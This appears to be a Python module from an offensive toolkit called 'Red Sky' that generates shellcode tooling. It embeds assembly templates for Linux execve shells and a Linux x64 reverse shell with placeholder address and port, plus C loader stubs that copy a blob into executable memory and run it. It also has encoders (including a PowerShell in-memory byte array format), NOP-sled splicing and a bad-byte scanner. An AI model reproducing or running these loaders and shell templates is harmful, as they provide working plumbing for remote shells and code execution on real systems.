# language: Python, file: Program/shellcode/gen.py, target: Red Sky shellcode — payload templates + encoders
# Generates shellcode-loadable payload skeletons for the common architectures.
# Not a payload builder — no kernel exploits, no AV-evading shellcode. This is
# the plumbing around shellcode:
#   stub       -- write a tiny C loader around a raw shellcode blob (lab use)
#   hexify     -- hex-encode / \x-encode / base64-encode a shellcode blob
#   splice     -- prepend / append NOP sleds, alignment, or a decoder stub
#   analyse    -- scan a shellcode blob for bad bytes, null-terminators, common sigs
#   templates  -- dump reference templates (x64, x86, ARM, ARM64)
# Plus: reference for common payload skeletons — reverse shell, bind shell,
# execve, MessageBox, exit — as asm / C source for compilation.

import argparse
import base64
import json
import re
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


SH_DIR = OUTPUT_DIR / "shellcode"
SH_DIR.mkdir(parents=True, exist_ok=True)


TEMPLATES = {
    "linux_x64_execve": {
        "arch": "x86-64",
        "os": "linux",
        "source": """; execve("/bin/sh", ["/bin/sh"], NULL) — 27 bytes
; nasm -f elf64 sh.asm && ld -o sh sh.o
global _start
section .text
_start:
    xor rdx, rdx
    mov rbx, 0x68732f6e69622f
    push rbx
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    mov al, 59
    syscall
""",
    },
    "linux_x64_revshell": {
        "arch": "x86-64",
        "os": "linux",
        "source": """; reverse shell to LHOST:LPORT — template, fill in the IP+port
; assemble with nasm -f elf64 rev.asm && objcopy -O binary rev.o rev.bin
; LHOST bytes go at the `dd` markers, LPORT (BE) at the port marker
global _start
section .text
_start:
    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov r8, rax

    ; build sockaddr_in
    push 0x00000000        ; padding
    mov dword [rsp+4], 0x00000000  ; placeholder LHOST (fill in)
    mov word [rsp+2], 0x0000       ; placeholder LPORT (BE)
    mov word [rsp], 0x0002         ; AF_INET
    mov rsi, rsp
    mov rdx, 16

    ; connect(sock, &addr, 16)
    mov rax, 42
    mov rdi, r8
    syscall

    ; dup2 sock -> 0,1,2
    mov rax, 33
    mov rdi, r8
    xor rsi, rsi
    syscall
    mov rax, 33
    mov rdi, r8
    mov rsi, 1
    syscall
    mov rax, 33
    mov rdi, r8
    mov rsi, 2
    syscall

    ; execve("/bin/sh", NULL, NULL)
    xor rdx, rdx
    mov rbx, 0x68732f6e69622f
    push rbx
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    mov al, 59
    syscall
""",
    },
    "windows_x64_messagebox": {
        "arch": "x86-64",
        "os": "windows",
        "source": """; MessageBoxA(NULL, "hi", "hi", 0) — skeleton in C, compile
; with cl /Fe:mb.exe mb.c
#include <windows.h>
int main(void) {
    MessageBoxA(NULL, "hi", "hi", MB_OK);
    return 0;
}
""",
    },
    "windows_x64_shellcode_stub": {
        "arch": "x86-64",
        "os": "windows",
        "source": """; Minimal shellcode loader skeleton — pop a shellcode blob into
; RWX and jump. Reference only. Compile with cl /Fe:loader.exe loader.c
#include <windows.h>
#include <stdio.h>

unsigned char sc[] = { /* SHELLCODE */ };

int main(void) {
    LPVOID p = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!p) return 1;
    memcpy(p, sc, sizeof(sc));
    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
    if (t) WaitForSingleObject(t, INFINITE);
    return 0;
}
""",
    },
    "linux_arm64_execve": {
        "arch": "aarch64",
        "os": "linux",
        "source": """; execve("/bin/sh", NULL, NULL) — aarch64 Linux
; as -o sh.o sh.s && ld -o sh sh.o
.global _start
_start:
    mov x8, #221           ; __NR_execve
    adr x0, bin_sh
    mov x1, #0
    mov x2, #0
    svc #0
bin_sh:
    .ascii "/bin/sh\\0"
""",
    },
}


def _load_blob(path: str) -> Optional[bytes]:
    p = Path(path).expanduser()
    if not p.exists():
        print_err("file not found: " + str(p))
        return None
    try:
        return p.read_bytes()
    except OSError as e:
        print_err("read failed: " + str(e))
        return None


def cmd_templates(name: str, out_dir: str) -> int:
    target = Path(out_dir) if out_dir else SH_DIR / "templates"
    target.mkdir(parents=True, exist_ok=True)

    if name and name != "all":
        if name not in TEMPLATES:
            print_err("unknown template: " + name)
            print_info("available: " + ", ".join(TEMPLATES.keys()))
            return 2
        keys = [name]
    else:
        keys = list(TEMPLATES.keys())

    for k in keys:
        t = TEMPLATES[k]
        # pick extension from os
        ext = ".asm" if "asm" in t["source"][:40] or "global" in t["source"][:40] else ".c"
        path = target / (k + ext)
        path.write_text(t["source"])
        print_ok(k + " -> " + str(path))

    print()
    print_kv("templates", str(len(keys)))
    print_kv("dir", str(target))
    return 0


def cmd_hexify(blob_path: str, fmt: str, out_file: str) -> int:
    data = _load_blob(blob_path)
    if data is None:
        return 1

    print_info("encoding shellcode blob")
    print_kv("input", blob_path)
    print_kv("bytes", str(len(data)))
    print_kv("format", fmt)
    print()

    if fmt == "hex":
        s = data.hex()
    elif fmt == "c":
        s = "\\x" + "\\x".join("{:02x}".format(b) for b in data)
    elif fmt == "c_array":
        lines = []
        for i in range(0, len(data), 12):
            chunk = data[i:i+12]
            lines.append("    " + ", ".join("0x{:02x}".format(b) for b in chunk) + ",")
        s = "unsigned char sc[] = {\n" + "\n".join(lines) + "\n};"
    elif fmt == "base64":
        s = base64.b64encode(data).decode()
    elif fmt == "ps":
        # PowerShell byte array for in-memory loading
        lines = []
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            lines.append("[Byte[]](" + ",".join("0x{:02x}".format(b) for b in chunk) + ")")
        s = " + ".join(lines)
    else:
        print_err("unknown format: " + fmt)
        return 2

    print(s[:400] + ("..." if len(s) > 400 else ""))
    out = Path(out_file) if out_file else SH_DIR / (Path(blob_path).stem + "_" + fmt + ".txt")
    out.write_text(s)
    print()
    print_kv("saved", out)
    return 0


def cmd_splice(blob_path: str, nop_count: int, align: int, out_file: str) -> int:
    data = _load_blob(blob_path)
    if data is None:
        return 1
    print_info("splicing shellcode")
    print_kv("input bytes", str(len(data)))
    print_kv("nop sled", str(nop_count))
    print_kv("align", str(align))
    print()

    # NOP sled: 0x90 for x86/x64, 0x1f 0x20 0x03 0xd5 for ARM64
    nop = b"\x90" * nop_count

    # align by padding the total to align bytes with a filler
    combined = nop + data
    if align > 1:
        pad = (-len(combined)) % align
        combined = combined + b"\x90" * pad
        print_kv("alignment pad", str(pad))

    out = Path(out_file) if out_file else SH_DIR / (Path(blob_path).stem + "_sled.bin")
    out.write_bytes(combined)
    print_ok("wrote " + str(out))
    print_kv("output bytes", str(len(combined)))
    return 0


def cmd_analyse(blob_path: str, out_file: str) -> int:
    data = _load_blob(blob_path)
    if data is None:
        return 1
    print_info("shellcode analysis")
    print_kv("input", blob_path)
    print_kv("bytes", str(len(data)))
    print()

    findings = {
        "length": len(data),
        "null_bytes": 0,
        "bad_bytes": {},
        "printable_strings": [],
        "high_entropy": False,
    }

    # null bytes
    findings["null_bytes"] = data.count(0)

    # bad bytes (common for HTTP/string-safe shellcode): 0x00 0x0a 0x0d 0x20 0x3a 0x3f
    for b in (0x00, 0x0a, 0x0d, 0x20, 0x3a, 0x3f):
        c = data.count(b)
        if c:
            findings["bad_bytes"]["0x{:02x}".format(b)] = c

    # printable strings >= 4 chars
    for m in re.finditer(rb"[\x20-\x7e]{4,}", data):
        findings["printable_strings"].append(m.group(0).decode("ascii", errors="replace"))

    # entropy check
    import math
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    ent = 0.0
    n = len(data)
    for f in freq:
        if f:
            p = f / n
            ent -= p * math.log2(p)
    findings["entropy"] = round(ent, 3)
    findings["high_entropy"] = ent > 6.0

    print_kv("null bytes", str(findings["null_bytes"]))
    print_kv("bad bytes", str(findings["bad_bytes"]) if findings["bad_bytes"] else "none")
    print_kv("entropy", str(findings["entropy"]) + (" (high)" if findings["high_entropy"] else ""))
    print()
    print(BOLD + "printable strings" + RESET)
    for s in findings["printable_strings"][:30]:
        print("  " + ARTERY + repr(s) + RESET)
    if not findings["printable_strings"]:
        print("  " + ASH + "(none)" + RESET)

    out = Path(out_file) if out_file else SH_DIR / (Path(blob_path).stem + "_analysis.json")
    out.write_text(json.dumps(findings, indent=2))
    print()
    print_kv("saved", out)
    return 0


def cmd_stub(blob_path: str, arch: str, osname: str, out_file: str) -> int:
    data = _load_blob(blob_path)
    if data is None:
        return 1
    arr = ", ".join("0x{:02x}".format(b) for b in data)

    if osname == "windows":
        stub = (
            "// shellcode loader stub — MSVC x64\n"
            "// cl /std:c++20 /Fe:loader.exe loader.c\n"
            "#include <windows.h>\n"
            "#include <cstdio>\n\n"
            "unsigned char sc[] = { " + arr + " };\n\n"
            "int main(void) {\n"
            "    LPVOID p = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
            "    if (!p) return 1;\n"
            "    memcpy(p, sc, sizeof(sc));\n"
            "    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);\n"
            "    if (t) WaitForSingleObject(t, INFINITE);\n"
            "    return 0;\n"
            "}\n"
        )
    else:
        stub = (
            "// shellcode loader stub — Linux gcc\n"
            "// gcc -o loader loader.c -z execstack\n"
            "#include <stdio.h>\n"
            "#include <string.h>\n"
            "#include <sys/mman.h>\n\n"
            "unsigned char sc[] = { " + arr + " };\n\n"
            "int main(void) {\n"
            "    void *p = mmap(0, sizeof(sc), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0);\n"
            "    if (p == MAP_FAILED) return 1;\n"
            "    memcpy(p, sc, sizeof(sc));\n"
            "    ((void(*)())p)();\n"
            "    return 0;\n"
            "}\n"
        )

    out = Path(out_file) if out_file else SH_DIR / (Path(blob_path).stem + ("_stub.c" if osname == "windows" else "_stub.c"))
    out.write_text(stub)
    print_ok("wrote " + str(out))
    print_kv("arch", arch)
    print_kv("os", osname)
    print_kv("bytes", str(len(data)))
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky shellcode gen", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="templates",
                   choices=["templates", "hexify", "splice", "analyse", "stub"])
    p.add_argument("blob", nargs="?", default="")
    p.add_argument("--format", default="c", choices=["hex", "c", "c_array", "base64", "ps"])
    p.add_argument("--nop", type=int, default=16)
    p.add_argument("--align", type=int, default=16)
    p.add_argument("--arch", default="x86-64")
    p.add_argument("--os", dest="osname", default="linux", choices=["linux", "windows"])
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky shellcode gen <templates|hexify|splice|analyse|stub> [opts]")
        return 2

    if ns.help:
        print_info("templates [name|all]                    -- dump reference templates")
        print_info("hexify <blob.bin> [--format c|c_array|hex|base64|ps]")
        print_info("splice <blob.bin> [--nop 16] [--align 16]")
        print_info("analyse <blob.bin>                      -- null bytes, bad bytes, strings")
        print_info("stub <blob.bin> [--os linux|windows]    -- write a C loader stub")
        return 0

    if ns.action == "templates":
        return cmd_templates(ns.blob, ns.out)
    if ns.action == "hexify":
        if not ns.blob:
            print_err("give a blob file")
            return 2
        return cmd_hexify(ns.blob, ns.format, ns.out)
    if ns.action == "splice":
        if not ns.blob:
            print_err("give a blob file")
            return 2
        return cmd_splice(ns.blob, ns.nop, ns.align, ns.out)
    if ns.action == "analyse":
        if not ns.blob:
            print_err("give a blob file")
            return 2
        return cmd_analyse(ns.blob, ns.out)
    if ns.action == "stub":
        if not ns.blob:
            print_err("give a blob file")
            return 2
        return cmd_stub(ns.blob, ns.arch, ns.osname, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
